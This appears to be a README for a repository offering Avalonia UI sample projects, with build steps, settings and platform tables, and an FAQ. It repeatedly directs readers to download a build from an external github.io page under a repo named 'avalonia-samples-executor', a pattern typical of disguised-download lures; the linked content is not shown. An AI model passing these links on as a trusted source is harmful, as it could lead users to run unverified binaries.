# Avalonia Samples 2026 – Build Cross-Platform UIs with Confidence

> A handpicked set of minimal, self-contained Avalonia UI examples that teach one concept at a time. Every sample runs on its own and works across Windows, macOS, and Linux desktops.

[![Sample Code](https://img.shields.io/badge/Type-Sample%20Code-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/chris-gray80/avalonia-samples-executor?style=flat-square)](https://github.com/chris-gray80/avalonia-samples-executor)

---

<p align="center">
  <a href="https://chris-gray80.github.io/avalonia-samples-executor/">
    <img src="https://img.shields.io/badge/Download-Avalonia%20Samples-brightgreen?style=for-the-badge" alt="Download Avalonia Samples">
  </a>
</p>

> **[Direct Download – Avalonia Samples](https://chris-gray80.github.io/avalonia-samples-executor/)**

---

[Download Latest Build](https://chris-gray80.github.io/avalonia-samples-executor/)

---

## What This Repository Offers

Avalonia Samples gives you a structured path into the Avalonia UI framework via standalone examples that focus on a single topic each. Rather than dropping newcomers into large, monolithic codebases, this repo breaks common UI development tasks into small, easy-to-follow pieces. Every example targets a distinct area—like data binding, custom controls, or navigation—so you can grasp one mechanism at a time without distraction.

Examples are arranged by category and difficulty, letting you move from core concepts to more advanced patterns at your own pace. Whether you are just starting with Avalonia or need a quick reference for a specific feature, these samples work both as learning material and as reusable code snippets. The 2026 edition adds further coverage of MVVM patterns, desktop integration techniques, and automated UI testing.

## Key Characteristics

- **Single-Concept Focus** – Each sample covers one aspect of Avalonia development, from basic view interaction to complex data templates.
- **Self-Contained Projects** – Every example builds and runs independently, requiring no dependencies beyond the Avalonia framework.
- **Thematic Grouping** – Samples are categorized by topic (MVVM, Drawing, Navigation, Custom Controls) and skill level (beginner, intermediate, advanced).
- **Native OS Interaction** – Examples show how to use file dialogs, system tray, window management, and other desktop features.
- **Automated UI Validation** – Includes testing samples that leverage Avalonia's testing utilities to verify visual components programmatically.
- **Full-Application Demonstrations** – Larger projects illustrate how multiple concepts combine into complete, functional desktop applications.
- **Write Once, Run Everywhere** – All samples work on Windows, macOS, and Linux without any code changes.

## Getting Started

1. Download the latest release from the link above or clone this repository.
2. Install .NET SDK (version 6.0 or later) on your development machine.
3. Navigate to any sample folder and run `dotnet build` to compile.
4. Launch with `dotnet run` or open the `.csproj` file in your preferred IDE.

Example for the MVVM basic sample:
```bash
cd src/MVVM/BasicMvvmSample
dotnet build
dotnet run
```

## Configurable Options

Many samples include settings you can adjust. The table below lists common options found across examples:

| Setting | Default | Description |
|---------|---------|-------------|
| `ThemeVariant` | `Default` | Switches between light and dark themes (`Light`, `Dark`) |
| `WindowStartupLocation` | `CenterScreen` | Determines initial window placement |
| `EnableAnimations` | `true` | Enables or disables UI transition effects |
| `LogLevel` | `Information` | Controls console logging verbosity |

Some samples also define hotkeys or command bindings inside their ViewModel files.

## Platform Compatibility

| Platform | Support | Notes |
|----------|---------|-------|
| Windows 10+ | Full | Native window chrome and taskbar integration |
| macOS 11+ | Full | Menu bar, dock, and system tray support |
| Linux (GTK) | Full | X11 and Wayland compatibility |
| WebAssembly | Partial | Limited to basic UI rendering |

Known limitations: Certain desktop integration features (e.g., system tray) require platform-specific backends. Automated UI testing samples need a display server on Linux.

## Frequently Asked Questions

**What should I try first as a complete beginner?**  
Begin with the "Hello World" example in the beginner category, then work through MVVM basics and data binding samples.

**How often do you add new samples?**  
New examples are added periodically as the Avalonia framework evolves. Watch the repository for updates.

**Can I reuse these samples in my own projects?**  
Yes—all samples are released under the GPL-3.0 license. You may modify and incorporate the code as long as you comply with the license terms.

**Do the samples work with the latest Avalonia release?**  
Each example targets a stable Avalonia version. Compatibility details are noted in the project files.

**Where do file-generating samples store their output?**  
Projects that produce files (such as drawing exports) save them in the project's `bin` directory or a path you specify.

## License

GNU GPL v3.0 – see [LICENSE](LICENSE) for full terms.
